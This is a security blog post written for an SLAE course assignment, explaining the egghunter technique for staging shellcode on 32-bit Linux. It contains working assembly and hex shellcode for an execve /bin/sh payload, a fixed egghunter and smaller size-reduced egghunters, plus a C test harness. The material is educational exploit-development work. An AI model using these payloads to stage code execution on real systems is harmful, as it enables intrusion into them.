<!DOCTYPE html>
<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]-->
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <title>    Staging payload using Egghunter technique (SLAE, Assignment #3)
</title>
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="http://www.wryway.com/theme/css/cid.css">
        <link href="http://www.wryway.com/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Oleg's Web Log Atom Feed" />
        
 
        <link rel="apple-touch-icon" sizes="57x57" href="/icons/apple-touch-icon-57x57.png">
        <link rel="apple-touch-icon" sizes="60x60" href="/icons/apple-touch-icon-60x60.png">
        <link rel="apple-touch-icon" sizes="72x72" href="/icons/apple-touch-icon-72x72.png">
        <link rel="apple-touch-icon" sizes="76x76" href="/icons/apple-touch-icon-76x76.png">
        <link rel="apple-touch-icon" sizes="114x114" href="/icons/apple-touch-icon-114x114.png">
        <link rel="apple-touch-icon" sizes="120x120" href="/icons/apple-touch-icon-120x120.png">
        <link rel="apple-touch-icon" sizes="144x144" href="/icons/apple-touch-icon-144x144.png">
        <link rel="apple-touch-icon" sizes="152x152" href="/icons/apple-touch-icon-152x152.png">
        <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon-180x180.png">
        <link rel="icon" type="image/png" href="/icons/favicon-32x32.png" sizes="32x32">
        <link rel="icon" type="image/png" href="/icons/favicon-194x194.png" sizes="194x194">
        <link rel="icon" type="image/png" href="/icons/favicon-96x96.png" sizes="96x96">
        <link rel="icon" type="image/png" href="/icons/android-chrome-192x192.png" sizes="192x192">
        <link rel="icon" type="image/png" href="/icons/favicon-16x16.png" sizes="16x16">
        <link rel="manifest" href="/icons/manifest.json">
        <link rel="shortcut icon" href="/icons/favicon.ico">
        <meta name="msapplication-TileColor" content="#ffffff">
        <meta name="msapplication-TileImage" content="/icons/mstile-144x144.png">
        <meta name="msapplication-config" content="/icons/browserconfig.xml">
        <meta name="theme-color" content="#ffffff">
    </head>
    <body>
        <!--[if lt IE 7]>
            <p class="chromeframe">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> or <a href="http://www.google.com/chromeframe/?redirect=true">activate Google Chrome Frame</a> to improve your experience.</p>
        <![endif]-->

            <div class="container">

<header class="blog-header">
    <h1><a href="http://www.wryway.com/blog/">Oleg's Web Log</a></h1>
    <p> Stochastic records on Information Security and IT in general </p>
    <nav>
        <a href="http://www.wryway.com/blog/categories/">CATEGORIES</a>
        <a href="http://www.wryway.com/blog/tags/">TAGS</a>
        <a href="http://www.wryway.com/blog/archives/">ARCHIVES</a>
    </nav>
</header>

    <div class="post">

        <header>
            <h1>Staging payload using Egghunter technique (SLAE, Assignment #3)</h1>
            <p class="category">
                Category: <a class="category" href="http://www.wryway.com/blog/category/exploit-development/"><b>Exploit development</b></a>
            </p>
            <p class="date">
                Written on <time datetime="2015-10-04T19:00:00-04:00">Oct 04, 2015</time>
            </p>
        </header>

        <article>
            <h1>Introduction</h1>
<p>This post is dedicated to the 3rd assignment of the <a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">SLAE</a> certification exam. I prioritized this assignment because it was the only one that touched upon the subject not covered in the course.</p>
<p>The most often cited paper on <em>egghunter</em> technique to date is <a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf">Matt Miller's (aka skape) "Safely Searching Process Virtual Address Space"</a>. To not deviate from the established tradition I will use that paper as the main reference too.</p>
<p>The whole technique is about staging exploitation in two steps in cases when you have insufficient space to fit an entire payload in the place where you have gained execution control. It works similar to staged Metasploit payloads: the first payload (stager) exploits vulnerability, takes control of the execution and downloads the second part (stage) - the fully-fledged and feature-reach payload (e.g. Meterpreter). In case of the egghunter, the egg-searching code is a stager that is used to find a unique marker, the egg, and pass execution to the stage, the main payload, following the egg.</p>
<p>One important condition for using the egghunter technique is that besides exploiting a vulnerability that provides you with an opportunity for injecting the egghunter staging code, you must be able to somehow feed the vulnerable application your main payload such that it is stored somewhere in the application's memory.</p>
<h1>The egg</h1>
<p>The size of the shellcode recommended by Matt is 8 bytes. The reason cited is that implementations for the egg hunting algorithms tend to have four-byte versions of the egg stored once in the searching code itself, thus making it possible to accidentally run into the egg hunter itself instead of the expected payload, if one were to use a four byte version of the egg. In the text below we will see how this issue can be overcome, at the same time reducing the egghunter size.</p>
<p>Depending on the egghunter logic an egg may be required to consist of executable instructions. That is the egg must be executable if egghunter passes execution to the egg itself and it doesn't have to be executable when the egghunter skips the egg and passes execution to the payload. Note that I didn't say that your egg can be comprised of anything you want in the second case. Remember that the egg pattern must be as uncommon as possible. For example, it is <em>not</em> uncommon to encounter <code>or ax, 0xffff</code> instruction which translates to <code>\x66\x83\xC8\xFF</code> opcode sequence. And if you choose this sequence as your egg, there is a high possibility that the egghunter will stumble upon this sequence elsewhere in the process memory and transfer execution to the wrong place. So you should be careful when you choose your egg pattern, especially if it shorter than 8 bytes.</p>
<p>To satisfy the requirement of executable egg pattern, instructions that don't change the logic of the execution flow are usually used. Vivek Ramachandran, the SLAE course instructor, calls them <em>nop-equivalents</em>. For example, the following 1-byte instructions can be mixed to create an executable egg pattern: <code>nop</code>, <code>push/pop r32</code>, <code>inc/dec r32</code>, <code>pushad/popad</code>, <code>pushfd</code>, <code>push/pop cs/ds/ss/es</code>, <code>xchg eax</code>, <code>r32</code>, etc.</p>
<h1>Analyzing egghunter source code</h1>
<p>First we will create a simple shellcode to work with. The shellcode launches the /bin/sh shell using execve system call. Follows the source code and the command used to build the binary:</p>
<div class="highlight"><pre><span></span><span class="k">section</span> <span class="nv">.text</span>
    <span class="k">global</span> <span class="nv">_start</span>

<span class="nl">_start:</span>
    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>    <span class="c1">; We need some nulls to delimit arguments on the stack</span>
    <span class="nf">push</span> <span class="nb">eax</span>        <span class="c1">; Push the first delimeter: null terminator for the string</span>
    <span class="nf">push</span> <span class="mh">0x68732f6e</span> <span class="c1">; Push the string with a program name to launch</span>
    <span class="nf">push</span> <span class="mh">0x69622f2f</span>
    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>    <span class="c1">; 1st param: pointer to the string of the program to launch</span>
    <span class="nf">push</span> <span class="nb">eax</span>        <span class="c1">; Push nulls on the stack to terminate array of string pointers</span>
    <span class="nf">push</span> <span class="nb">ebx</span>        <span class="c1">; Push pointer to string pointer thus creating array of string </span>
                    <span class="c1">; pointers</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>    <span class="c1">; 2nd param: pointer to array of string pointers (args)</span>
    <span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>    <span class="c1">; 3rd param: env vars. Null here works fine.</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">11</span>      <span class="c1">; execve syscall</span>
    <span class="nf">int</span> <span class="mh">80h</span>
</pre></div>


<div class="divider"></div>

<div class="highlight"><pre><span></span>nasm -f elf stacksh.asm <span class="o">&amp;&amp;</span> ld stacksh.o -o stacksh
</pre></div>


<p><img alt="Making sure the payload works" src="http://www.wryway.com/blog/egghunter-technqiue-for-exploit-development/making-sure-payload-works.png" title="Making sure the payload works">
<div class="img-caption">Making sure the payload works</div></p>
<p>In our next step we extract the shellcode string from the code section of the binary using <a href="https://github.com/reider-roque/reed/tree/master/tools">scdump</a> helper script I created while going through the SLAE course:</p>
<p><img alt="Extracting shellcode" src="http://www.wryway.com/blog/egghunter-technqiue-for-exploit-development/extracting-shellcode.png" title="Extracting shellcode">
<div class="img-caption">Extracting shellcode</div></p>
<p>The extracted shellcode string:
<code>\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80</code></p>
<p>Next, I will use the second Linux egghunter shellcode found in the aforementioned paper, fix it, explain how it works and make some modifications to reduce its size. </p>
<p>Here is the initial egghunter source with my comments:</p>
<div class="highlight"><pre><span></span><span class="nl">_start:</span>
    <span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>        <span class="c1">; Begin from the lowest memory address, which is 0</span>
<span class="nl">.nextpage:</span>
    <span class="nf">or</span> <span class="nb">dx</span><span class="p">,</span> <span class="mh">0xfff</span>        <span class="c1">; This and the next instruction combined add 0x1000 (4096)</span>
                        <span class="c1">; to the edx register; this is the size of memory page</span>
<span class="nl">.nextbyte:</span>
    <span class="nf">inc</span> <span class="nb">edx</span>             <span class="c1">; Either compliment the previous instruction and go to ...</span>
                        <span class="c1">; ... the next page or go to the next byte</span>
    <span class="nf">lea</span> <span class="nb">ebx</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span><span class="o">+</span><span class="mh">0x4</span><span class="p">]</span>  <span class="c1">; Load the next after the current dword into ebx</span>
    <span class="nf">push</span> <span class="kt">byte</span> <span class="mh">0x21</span>      <span class="c1">; This and the next instruction load the access ...</span>
    <span class="nf">pop</span> <span class="nb">eax</span>             <span class="c1">; ... syscall code into the eax</span>
    <span class="nf">int</span> <span class="mh">80h</span>             <span class="c1">; Tell kernel to do the syscall</span>
    <span class="nf">cmp</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0xf2</span>        <span class="c1">; See if syscall returned EFAULT error meaning that we ...</span>
    <span class="nf">jz</span> <span class="nv">.nextpage</span>        <span class="c1">; ... landed on unallocated memory page and should skip it</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0x50905090</span> <span class="c1">; If we landed on the correct memory address, load the ...</span>
                        <span class="c1">; ... eax with our egg to compare</span>
    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">edx</span>        <span class="c1">; Check if the first dword in the 8 byte sequence ...</span>
    <span class="nf">scasd</span>               <span class="c1">; ... matches the egg</span>
    <span class="nf">jnz</span> <span class="nv">.nextbyte</span>       <span class="c1">; Continue to the next byte if does not match, or ...</span>
    <span class="nf">scasd</span>               <span class="c1">; ... if it matches check the next second dword</span>
    <span class="nf">jnz</span> <span class="nv">.nextbyte</span>       <span class="c1">; Continue to the next byte if 2nd dword does not match</span>
    <span class="nf">jmp</span> <span class="nb">edi</span>             <span class="c1">; The egg is found! Pass control to the main payload</span>
</pre></div>


<p>The egghunter searches for an 8 byte doubled-egg - <code>\x90\x50\x90\x50\x90\x50\x90\x50</code>. That's why it checks for matching dword <code>0x50905090</code> two times. </p>
<p>The following instruction sequence</p>
<div class="highlight"><pre><span></span><span class="nf">or</span> <span class="nb">dx</span><span class="p">,</span> <span class="mh">0xfff</span>
<span class="nf">inc</span> <span class="nb">edx</span>
</pre></div>


<p>is equivalent to</p>
<div class="highlight"><pre><span></span><span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="mh">0x1000</span>
</pre></div>


<p>But because of the smart trick employed by the original shellcode author to reduce the code size, the second part of the sequence is actually "reused" for traversing bytes inside of a valid memory page. </p>
<p>In the following instruction</p>
<div class="highlight"><pre><span></span><span class="nf">lea</span> <span class="nb">ebx</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span><span class="o">+</span><span class="mh">0x4</span><span class="p">]</span>
</pre></div>


<p>value 0x4 is added to the address held in EDX because it allows eight bytes of contiguous memory to be validated in a single swoop. The reason that it works in all cases is because the implementation will increment by page size when it encounters invalid addresses, thus it’s impossible that EDX+0x4 could be valid and EDX itself not.</p>
<p>To traverse through memory the implementation relies on the <code>access</code> system call (0x21) that checks whether the calling process can access the file at the specified pathname. But its main functionality is not used in this case. The implementation actually uses the side effect of the function: when it tries to access the pathname string by its address loaded in EBX it returns an <code>EFAULT</code> error meaning that pathname points outside of process's accessible address space. So when we get the <code>EFAULT</code> error code returned in EAX we may conclude that EBX points to unmapped inaccessible memory and hence we can safely skip the current page and check the next one.</p>
<p>The <code>EFAULT</code> constant is defined as equal to 14 (0xe). But when this error occurs the kernel actually returns its value negated: -EFAULT = -0xe = 0xffffffff-0xe = 0xfffffff2. That's why the following part of the code</p>
<div class="highlight"><pre><span></span><span class="nf">cmp</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0xf2</span>
</pre></div>


<p>checks if AL (lowest 8 bits of EAX register) contains 0xf2.</p>
<h1>Fixing the bug</h1>
<p>The access function signature can be found in Linux manual pages by running <code>man 2 access</code> command:</p>
<div class="highlight"><pre><span></span>int access(const char *pathname, int mode);
…
ERRORS
        access() shall fail if:
        …
        EFAULT pathname points outside your accessible address space.
        EINVAL mode was incorrectly specified.
        …
</pre></div>


<p>Note that it actually takes 2 parameters. And that was the reason the reference implementation did not work for me. Most likely Linux developers have changed internal implementation of the <code>access</code> function from the time skape wrote his paper. </p>
<p>Following Linux syscall convention the 1<sup>st</sup> syscall argument goes into EBX register, 2<sup>nd</sup> into ECX, 3<sup>rd</sup> into EDX, etc. The correct values for the second argument that must be put into ECX, according to the man page and <code>/usr/include/unistd.h</code> file, can be a value of 0 through 7. And when it is not the case the function, instead of <code>EFAULT</code>, returns the <code>EINVAL</code> error and the whole construction collapses resulting in a segfault. To fix the issue I had to insert</p>
<div class="highlight"><pre><span></span><span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>
</pre></div>


<p>right before <code>int 80h</code> instruction, effectively setting the second argument for the access function to be 0, which is a valid value.</p>
<p>Now, after the egghunter is fixed we can build a binary out of it and extract the payload:</p>
<div class="highlight"><pre><span></span>nasm -f elf egghunter2.asm <span class="o">&amp;&amp;</span> ld egghunter2.o -o egghunter2
scdump egghunter2
</pre></div>


<p>Output (formatted to fit the screen):</p>
<div class="highlight"><pre><span></span>Length: 37
Payload: &quot;\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\x31\xc9\xcd&quot;
&quot;\x80\x3c\xf2\x74\xec\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7&quot;
</pre></div>


<p>Note that original shellcode length (35 bytes) increased by 2 bytes because of the applied fix.</p>
<p>After inserting the egghunter and our earlier generated payload into a C source code and compiling it we get a working PoC:</p>
<div class="highlight"><pre><span></span>gcc scframe.c -fno-stack-protector -z execstack -o scframe <span class="o">&amp;&amp;</span> ./scframe
</pre></div>


<p><img alt="Working egghunter PoC" src="http://www.wryway.com/blog/egghunter-technqiue-for-exploit-development/working-egghunter-poc.png" title="Working egghunter PoC">
<div class="img-caption">Working egghunter PoC</div></p>
<p>Contents of the scframe.c:</p>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>

<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">egghunter</span><span class="p">[]</span> <span class="o">=</span>  
<span class="s">&quot;</span><span class="se">\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\x31\xc9\xcd\x80\x3c</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\xf2\x74\xec\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7</span><span class="s">&quot;</span><span class="p">;</span>

<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> 
<span class="s">&quot;</span><span class="se">\x90\x50\x90\x50\x90\x50\x90\x50</span><span class="s">&quot;</span>  <span class="c1">// EGG</span>
<span class="s">&quot;</span><span class="se">\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89</span><span class="s">&quot;</span> <span class="c1">// SHELLCODE</span>
<span class="s">&quot;</span><span class="se">\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80</span><span class="s">&quot;</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Egghunter length: %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">egghunter</span><span class="p">));</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Shellcode length: %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>

    <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span><span class="p">))</span><span class="n">egghunter</span><span class="p">)();</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>


<h1>Reducing the size</h1>
<p>Trying to reduce the size of the shellcode I looked at other Linux syscalls hoping to find one whose side effect I could use in a similar manner and which took only one pointer argument. And I found one - <code>chdir</code>. </p>
<p>The only argument the function takes is the pointer to a string containing path. It is not as good as the access function and in the worst case scenario, if it encounters a valid directory path in the process memory you will end up running in some random directory. On the positive side using this system call we can claim back the added bytes by removing the <code>xor ecx, ecx</code> instruction. The changed part of the egghunter:</p>
<div class="highlight"><pre><span></span>    <span class="nf">push</span> <span class="kt">byte</span> <span class="mh">0xc</span>   <span class="c1">; chdir syscall # </span>
    <span class="nf">pop</span> <span class="nb">eax</span>
    <span class="nf">int</span> <span class="mh">80h</span>
</pre></div>


<p>After re-building the egghunter, extracting the shellcode with <code>scdump</code>, inserting it into our C program and, finally, building it we get another working sample which is 35 bytes long:</p>
<p><img alt="Egghunter with replaced system call" src="http://www.wryway.com/blog/egghunter-technqiue-for-exploit-development/egghunter-with-replaced-system-call.png" title="Egghunter with replacecd system call">
<div class="img-caption">Egghunter with replaced system call</div></p>
<p>Next, to win us a couple more bytes we can use 4 bytes long egg and modify the algorithm. To solve the problem of storing the same egg pattern with the egghunter algo we can simply modify the egg after loading it into EAX register and then prepend the modified version to the main payload. This change eliminates check for the second dword of 8-byte long egg. The modified code follows:</p>
<div class="highlight"><pre><span></span><span class="k">section</span> <span class="nv">.text</span>
    <span class="k">global</span> <span class="nv">_start</span>

<span class="nl">_start:</span>
    <span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>
<span class="nl">.nextpage:</span>
    <span class="nf">or</span> <span class="nb">dx</span><span class="p">,</span> <span class="mh">0xfff</span>
<span class="nl">.nextbyte:</span>
    <span class="nf">inc</span> <span class="nb">edx</span>
    <span class="nf">lea</span> <span class="nb">ebx</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span><span class="p">]</span>
    <span class="nf">push</span> <span class="kt">byte</span> <span class="mh">0xc</span>        <span class="c1">; chdir syscall</span>
    <span class="nf">pop</span> <span class="nb">eax</span>
    <span class="nf">int</span> <span class="mh">80h</span>
    <span class="nf">cmp</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0xf2</span>
    <span class="nf">jz</span> <span class="nv">.nextpage</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0x50905090</span>
    <span class="nf">inc</span> <span class="nb">eax</span>
    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">edx</span>
    <span class="nf">scasd</span>
    <span class="nf">jnz</span> <span class="nv">.nextbyte</span>
    <span class="nf">jmp</span> <span class="nb">edi</span>
</pre></div>


<p>Note how we need to change the egg in front of our main payload in the C program. The first byte is now <code>\x91</code>:</p>
<div class="highlight"><pre><span></span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> 
<span class="s">&quot;</span><span class="se">\x91\x50\x90\x50</span><span class="s">&quot;</span>  <span class="c1">// EGG</span>
<span class="s">&quot;</span><span class="se">\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89</span><span class="s">&quot;</span> <span class="c1">// SHELLCODE</span>
<span class="s">&quot;</span><span class="se">\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80</span><span class="s">&quot;</span><span class="p">;</span>
</pre></div>


<p>Building and running C program with updated egghunter and egg we get the working result with 32-bytes long egghunter:</p>
<p><img alt="Final egghunter version, 32 bytes long" src="http://www.wryway.com/blog/egghunter-technqiue-for-exploit-development/egghunter-final-version.png" title="Final egghunter version, 32 bytes long">
<div class="img-caption">Final egghunter version, 32 bytes long</div></p>
<div class="divider"></div>

<div class="divider"></div>

<div class="divider"></div>

<div class="divider"></div>

<p><hr>
This blog post was created to fulfill the requirements of the <a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">SecurityTube Linux Assembly Expert</a> certification. Student id: SLAE-685.</p>
<p>The source files created while completing the assignment can be found in my <a href="https://github.com/reider-roque/slae">GitHub repository</a>.</p>
        </article>

        <footer>
            <p>
                Tags:  
 
                    <a class="tag" href="/blog/tag/slae/">SLAE</a>
 
                    <a class="tag" href="/blog/tag/linux/">Linux</a>
            </p>
        </footer>

<div class="comments">
    <div id="disqus_thread"></div>
    <script type="text/javascript">
        var disqus_shortname = 'wryway';
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>

    </div>


<footer class="blog-footer">

    <ul class="nav">

            <li><a href="https://github.com/reider-roque">Github</h3>
            </a></li>
            <li><a href="https://linkedin.com/in/olegmi">Linkedin</h3>
            </a></li>
    <script type="text/javascript">
        // JS ROT13 by http://techblog.tilllate.com/2008/07/20/ten-methods-to-obfuscate-e-mail-addresses-compared/
        document.write( "<yv><n uers=\"znvygb:byrt@jeljnl.pbz\" ery=\"absbyybj\">Rznvy</n></yv>".replace(/[a-zA-Z]/g, function(c){return String.fromCharCode((c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26);}));
    </script>
    </ul>

    <p class="disclaimer">
    Oleg Mitrofanov &copy; 2015-2017.
    Built with <a href="http://getpelican.com">Pelican</a>, and <a href="https://github.com/hdra/Pelican-Cid">Cid</a> theme.
    </p>
</footer>
            </div>
<script>
    var _gaq=[['_setAccount','UA-68669065-1'],['_trackPageview']];
    (function(d,t){var g=d.createElement(t),s=d.getElementsByTagName(t)[0];
    g.src=('https:'==location.protocol?'//ssl':'//www')+'.google-analytics.com/ga.js';
    s.parentNode.insertBefore(g,s)}(document,'script'));
</script>
    </body>
</html>